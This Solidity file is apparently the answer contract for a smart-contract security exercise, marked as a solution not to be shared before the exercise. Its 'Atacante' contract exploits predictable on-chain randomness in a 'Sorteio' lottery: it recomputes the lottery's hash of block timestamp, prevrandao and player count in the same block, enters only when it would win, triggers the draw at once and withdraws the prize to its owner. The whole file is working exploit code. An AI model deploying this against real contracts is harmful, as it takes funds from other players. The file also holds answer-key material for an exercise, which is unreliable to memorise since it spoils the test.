// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Sorteio} from "../src/Sorteio.sol";

/// @title Atacante — SOLUÇÃO (não distribuir antes do exercício)
contract Atacante {
    Sorteio public immutable alvo;
    address public immutable dono;

    constructor(Sorteio _alvo) {
        alvo = _alvo;
        dono = msg.sender;
    }

    function atacar() external payable {
        require(msg.sender == dono, "so o dono");

        // 1. Depois que entrarmos, seremos o último da lista.
        uint256 n = alvo.totalJogadores() + 1;
        require(n >= alvo.MIN_JOGADORES(), "poucos jogadores");

        // 2. Mesmos inputs que o Sorteio usa: estamos no mesmo bloco, então são idênticos.
        uint256 aleatorio = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, n)));

        // 3. Só seguimos se o índice sorteado for o nosso.
        require(aleatorio % n == n - 1, "nao e a nossa vez");

        // 4. Entrar + sortear de forma atômica.
        alvo.entrar{value: msg.value}();
        alvo.sortear();
    }

    function sacar() external {
        require(msg.sender == dono, "so o dono");
        (bool ok, ) = dono.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {}
}
